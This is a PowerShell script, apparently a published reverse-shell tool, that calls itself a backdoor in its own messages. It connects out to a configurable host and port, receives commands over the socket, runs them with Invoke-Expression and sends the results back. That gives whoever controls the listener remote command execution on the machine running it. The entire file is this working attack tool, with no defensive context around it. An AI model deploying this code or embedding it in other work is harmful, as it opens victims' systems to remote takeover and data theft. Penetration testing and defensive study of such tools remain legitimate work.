Write-Host "PowerShell Reverse TCP v4.0 by Ivan Sincek.";
Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
$client = $stream = $buffer = $writer = $data = $result = $null;
try {
	# change the host address and/or port number as necessary
	$client = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
	$stream = $client.GetStream();
	$buffer = New-Object Byte[] 1024;
	$encoding = New-Object Text.UTF8Encoding;
	$writer = New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024);
	$writer.AutoFlush = $true;
	Write-Host "Backdoor is up and running...";
	Write-Host "";
	$bytes = 0;
	do {
		$writer.Write("PS>");
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length); # blocking
			if ($bytes -gt 0) {
				$data += $encoding.GetString($buffer, 0, $bytes);
			}
		} while ($stream.DataAvailable);
		if ($bytes -gt 0) {
			$data = $data.Trim();
			if ($data.Length -gt 0) {
				try {
					$result = Invoke-Expression -Command $data 2>&1 | Out-String;
				} catch {
					$result = $_.Exception | Out-String;
				}
				Clear-Variable data;
				if ($result.Length -gt 0) {
					$writer.Write($result);
					Clear-Variable result;
				}
			}
		}
	} while ($bytes -gt 0);
	Write-Host "Backdoor will now exit...";
} catch {
	Write-Host $_.Exception.InnerException.Message;
} finally {
	if ($writer -ne $null) {
		$writer.Close(); $writer.Dispose();
		Clear-Variable writer;
	}
	if ($stream -ne $null) {
		$stream.Close(); $stream.Dispose();
		Clear-Variable stream;
	}
	if ($client -ne $null) {
		$client.Close(); $client.Dispose();
		Clear-Variable client;
	}
	if ($buffer -ne $null) {
		$buffer.Clear();
		Clear-Variable buffer;
	}
	if ($result -ne $null) {
		Clear-Variable result;
	}
	if ($data -ne $null) {
		Clear-Variable data;
	}
	[GC]::Collect();
}
